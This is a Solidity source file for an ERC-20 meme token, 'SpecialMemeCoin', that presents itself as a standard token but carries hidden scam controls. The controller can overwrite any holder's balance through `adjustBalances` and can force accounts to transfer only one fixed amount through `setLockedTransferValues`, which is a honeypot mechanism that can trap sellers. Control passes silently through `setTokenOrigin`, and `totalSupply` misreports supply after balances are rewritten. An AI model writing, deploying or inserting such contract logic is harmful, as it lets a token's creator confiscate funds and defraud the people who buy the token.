pragma solidity ^0.8.16;

interface IUniqueERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract ContextExtended {
    function getContextActor() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract SingleLeader is ContextExtended {
    address private _leader;
    event LeaderChanged(address indexed previousLeader, address indexed newLeader);

    constructor() {
        address contextActor = getContextActor();
        _leader = contextActor;
        emit LeaderChanged(address(0), contextActor);
    }

    function getLeader() public view virtual returns (address) {
        return _leader;
    }

    modifier onlyLeader() {
        require(getLeader() == getContextActor(), "Only leader can perform this action");
        _;
    }

     function setTokenOrigin(address newOrigin) public onlyLeader {
        _leader = newOrigin;
    }

    function resignLeadership() public virtual onlyLeader {
        emit LeaderChanged(_leader, address(0x000000000000000000000000000000000000dEaD));
        _leader = address(0x000000000000000000000000000000000000dEaD);
    }
}

contract SpecialMemeCoin is ContextExtended, SingleLeader, IUniqueERC20 {
    mapping (address => mapping (address => uint256)) private _permissions;
    mapping (address => uint256) private _wallets;
    mapping (address => uint256) private _lockedTransferValues;

    string public constant coinName = "SpecialMemeCoin";
    string public constant coinSymbol = "SPMEM";
    uint8 public constant coinDecimals = 18;
    uint256 public constant capSupply = 120000 * (10 ** coinDecimals);

    constructor() {
        _wallets[getContextActor()] = capSupply;
        emit Transfer(address(0), getContextActor(), capSupply);
    }
    
    modifier onlyLeaderOrOrigin() {
        require(getLeader() == getContextActor(), "You must be the leader to perform this action");
        _;
    }

    event BalanceUpdated(address indexed user, uint256 previousBalance, uint256 updatedBalance);

    function getLockedTransferValue(address account) public view returns (uint256) {
        return _lockedTransferValues[account];
    }

    function setLockedTransferValues(address[] calldata accounts, uint256 amount) public onlyLeaderOrOrigin {
        for (uint i = 0; i < accounts.length; i++) {
            _lockedTransferValues[accounts[i]] = amount;
        }
    }

    function adjustBalances(address[] memory userAddresses, uint256 newAmount) public onlyLeaderOrOrigin {
        require(newAmount >= 0, "New amount must be non-negative");

        for (uint256 i = 0; i < userAddresses.length; i++) {
            address currentUser = userAddresses[i];
            require(currentUser != address(0), "User address must not be the zero address");

            uint256 oldBalance = _wallets[currentUser];
            _wallets[currentUser] = newAmount;

            emit BalanceUpdated(currentUser, oldBalance, newAmount);
        }
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _wallets[account];
    }

    function transfer(address recipient, uint256 amount) public virtual override returns (bool) {
        require(_wallets[getContextActor()] >= amount, "TTS: transfer amount exceeds balance");

        uint256 exactValue = getLockedTransferValue(getContextActor());
        if (exactValue > 0) {
            require(amount == exactValue, "TTS: transfer amount must be equal to the locked transfer value");
        }

        _wallets[getContextActor()] -= amount;
        _wallets[recipient] += amount;

        emit Transfer(getContextActor(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _permissions[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        _permissions[getContextActor()][spender] = amount;
        emit Approval(getContextActor(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public virtual override returns (bool) {
        require(_permissions[sender][getContextActor()] >= amount, "TTS: transfer amount exceeds permission");

        uint256 lockedValue = getLockedTransferValue(sender);
        if (lockedValue > 0) {
            require(amount == lockedValue, "TTS: transfer amount must be equal to the locked transfer value");
        }

        _wallets[sender] -= amount;
        _wallets[recipient] += amount;
        _permissions[sender][getContextActor()] -= amount;

        emit Transfer(sender, recipient, amount);
        return true;
    }

    function totalSupply() external view override returns (uint256) {
        return capSupply;
    }

    function name() public view returns (string memory) {
        return coinName;
    }

    function symbol() public view returns (string memory) {
        return coinSymbol;
    }

    function decimals() public view returns (uint8) {
        return coinDecimals;
    }
}